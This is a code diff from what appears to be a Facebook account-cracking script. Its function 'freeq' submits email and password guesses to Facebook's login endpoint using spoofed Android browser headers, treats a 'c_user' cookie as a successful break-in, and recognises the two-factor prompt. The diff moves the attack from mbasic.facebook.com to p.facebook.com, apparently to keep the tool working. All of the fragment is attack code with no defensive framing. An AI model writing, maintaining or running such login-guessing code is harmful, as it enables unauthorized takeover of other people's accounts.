@@ -1679,7 +1679,7 @@ def freeq(uid,pwx,tl):
             "email": uid,
             "pass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             "login": "Log In"}
-            headers = {'authority':'mbasic.facebook.com',
+            headers = {'authority':'p.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1696,7 +1696,7 @@ def freeq(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://p.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
